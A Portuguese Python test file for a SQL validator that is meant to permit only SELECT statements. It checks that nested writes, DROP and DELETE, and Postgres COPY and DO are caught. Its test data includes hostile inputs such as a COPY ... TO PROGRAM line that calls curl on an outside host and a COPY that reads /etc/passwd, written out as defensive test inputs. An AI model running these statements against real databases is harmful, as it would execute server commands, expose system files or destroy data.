"""A segunda linha de defesa do SQL apanhava 1 em 6.

A promessa ao cliente é que só corremos **SELECT** na base dele. Quem a
garante é o `AdvancedSQLValidator`, em duas etapas: uma regex à entrada e uma
verificação sobre a árvore sintáctica.

A segunda etapa não funcionava. Duas razões, ambas silenciosas:

1. `token.ttype is Keyword` compara por identidade, e o sqlparse classifica
   `DELETE` como `Keyword.DML` e `DROP` como `Keyword.DDL` — tipos *filhos*,
   não o mesmo objecto. De seis operações testadas, só `CALL` (que é
   `Keyword` puro) era apanhada.
2. `statement.tokens` é raso: uma escrita dentro de um parêntese, de um CTE
   ou de um subselect nunca chegava à superfície.

**Nada passou por causa disto** — a primeira etapa recusa todos estes casos, e
confirmei-o a correr o `validate()` completo. Mas uma segunda linha de defesa
que não defende nada é pior do que não a ter: quem lê o código conta com ela,
e a primeira etapa é uma regex — o género de coisa que alguém simplifica um
dia, a pensar que o AST tem as costas quentes.

Faltavam também `COPY` e `DO`, os dois piores do Postgres: `COPY ... TO
PROGRAM` corre comandos da máquina, e `DO $$ ... $$` executa PL/pgSQL
arbitrário.
"""

from __future__ import annotations

import sqlparse

from core.sql.validator_advanced import AdvancedSQLValidator


def _validador() -> AdvancedSQLValidator:
    return AdvancedSQLValidator(allowed_tables=["vendas"])


def _perigoso(sql: str) -> bool:
    return _validador()._has_dangerous_operations(sqlparse.parse(sql)[0])


ESCRITAS = [
    "DELETE FROM vendas",
    "DROP TABLE vendas",
    "INSERT INTO vendas VALUES (1)",
    "UPDATE vendas SET x = 1",
    "TRUNCATE vendas",
    "CALL algo()",
    "GRANT ALL ON vendas TO public",
    "REVOKE ALL ON vendas FROM public",
]

#: Os dois do Postgres que saem da base de dados para a máquina.
FUGA_DO_POSTGRES = [
    "COPY vendas TO PROGRAM 'curl http://algures.pt'",
    "COPY vendas FROM '/etc/passwd'",
    "DO $$ BEGIN DELETE FROM vendas; END $$",
]

ESCONDIDAS = [
    "WITH x AS (DELETE FROM vendas RETURNING id) SELECT id FROM x",
    "SELECT id FROM (DELETE FROM vendas RETURNING id) t",
]

LEGITIMAS = [
    "SELECT id FROM vendas LIMIT 10",
    "SELECT count(id) FROM vendas WHERE data > '2026-01-01' GROUP BY id LIMIT 5",
    "WITH t AS (SELECT id FROM vendas) SELECT id FROM t LIMIT 10",
    "SELECT id, nome FROM vendas ORDER BY data DESC LIMIT 100",
]


def test_apanha_todas_as_escritas():
    falharam = [s for s in ESCRITAS if not _perigoso(s)]
    assert falharam == [], f"passaram sem serem apanhadas: {falharam}"


def test_apanha_o_copy_e_o_do():
    """Os dois que não estavam sequer na lista."""
    falharam = [s for s in FUGA_DO_POSTGRES if not _perigoso(s)]
    assert falharam == [], f"passaram sem serem apanhadas: {falharam}"


def test_apanha_escritas_escondidas_dentro_de_parenteses():
    """O `statement.tokens` raso nunca via estas."""
    falharam = [s for s in ESCONDIDAS if not _perigoso(s)]
    assert falharam == [], f"passaram sem serem apanhadas: {falharam}"


def test_nao_recusa_leituras_legitimas():
    """A outra metade. Apertar isto até recusar SELECTs normais seria trocar
    um problema teórico por um produto que não responde a nada."""
    recusadas = [s for s in LEGITIMAS if _perigoso(s)]
    assert recusadas == [], f"recusadas sem razão: {recusadas}"


def test_o_validador_completo_continua_a_recusar_o_perigoso():
    """De ponta a ponta, que é o que interessa ao cliente."""
    v = _validador()
    for sql in ESCRITAS + FUGA_DO_POSTGRES + ESCONDIDAS:
        ok, _motivo = v.validate(sql)
        assert ok is False, f"o validador completo deixou passar: {sql}"


def test_o_validador_completo_continua_a_aceitar_o_legitimo():
    v = _validador()
    for sql in LEGITIMAS:
        ok, motivo = v.validate(sql)
        assert ok is True, f"recusou um SELECT legítimo: {sql} ({motivo})"
